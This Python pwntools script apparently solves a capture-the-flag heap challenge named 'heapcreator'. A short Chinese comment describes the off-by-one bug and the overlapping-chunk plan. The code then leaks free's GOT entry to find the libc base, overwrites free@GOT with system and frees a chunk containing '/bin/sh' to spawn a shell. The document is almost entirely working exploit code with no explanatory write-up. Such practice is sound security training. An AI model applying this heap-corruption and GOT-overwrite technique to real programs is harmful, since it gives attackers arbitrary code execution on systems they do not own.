# -*- coding: utf-8 -*-
from pwn import *

context(log_level='debug')
'''
漏洞：edit off-by-one
利用：
1、两层malloc，扩展一个造成位置重叠，后malloc的可以改先malloc的内容（addr，size）。
2、先malloc的是地址索引，通过show和edit可以任意地址读写。
'''
p = process("./heapcreator")
elf = ELF("./heapcreator")
libc = ELF("./libc.so.6")

def create(size, content):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(content)

def edit(idx, content):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))
    p.recvuntil(":")
    p.sendline(content)

def show(idx):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil(":")
    p.sendline("4")
    p.recvuntil(":")
    p.sendline(str(idx))

gdb.attach(proc.pidof(p)[0], gdbscript="b main")
free_got = elf.got["free"]
create(0x18, "aaaa")    #0
create(0x10, "bbbb")    #1
pause()
edit(0, "/bin/sh\x00"+"a"*0x10+"\x41")
delete(1)
create(0x30, p64(0) * 4 + p64(0x10) + p64(elf.got['free']))
show(1)
p.recvuntil("Content : ")
data = p.recvuntil("Done !")
free_addr = u64(data.split("\n")[0].ljust(8, "\x00"))
libc_base = free_addr - libc.symbols['free']
log.success('libc base addr: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
edit(1, p64(system_addr))
delete(0)


p.interactive()



